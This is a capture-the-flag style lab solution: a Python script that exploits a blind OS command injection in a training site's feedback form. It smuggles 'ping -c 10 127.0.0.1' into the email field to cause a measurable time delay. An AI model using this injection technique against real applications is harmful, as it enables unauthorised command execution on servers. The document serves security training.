# Blind OS command injection with time delays
> This lab contains a blind OS command injection vulnerability in the feedback function.
> The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.
> To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.

```python
import requests
import sys
from bs4 import BeautifulSoup

# --- Configuration ---
# Lab: Blind OS command injection with time delays
BASE_URL = "https://0a16003804dcacdf83c3822000300039.web-security-academy.net"

def exploit_time_delay(base_url):
    # 1. Define Endpoints
    form_url = base_url + "/feedback"         # GET this to find the token
    submit_url = base_url + "/feedback/submit" # POST to this to attack
    
    print(f"[*] Fetching CSRF token from {form_url}...")
    session = requests.Session()
    
    # 2. GET the form
    response = session.get(form_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    token_input = soup.find("input", {"name": "csrf"})
    if token_input:
        token = token_input['value']
        print(f"[+] Token found: {token}")
    else:
        print("[-] Token Not found. Check URL.")
        return

    # 3. Prepare Payload
    print("[*] Sending Blind Command Injection (Waiting 10s)...")
    data = {
        "csrf": token,
        "name": "CTUM",
        "email": "test@test.com||ping -c 10 127.0.0.1||",
        "subject": "Testing",
        "message": "Hello World"
    }
    
    # 4. POST the attack
    # Note: We send to submit_url, not form_url
    response = session.post(submit_url, data=data)
    
    # 5. Check Time
    elapsed = response.elapsed.total_seconds()
    print(f"[*] Response time: {elapsed:.2f} seconds")
    
    if response.status_code == 200 and elapsed > 9:
        print("[SUCCESS] Time delay confirmed! ")
    else:
        print("[-] Failed to trigger delay.")

if __name__ == "__main__":
    exploit_time_delay(BASE_URL)
```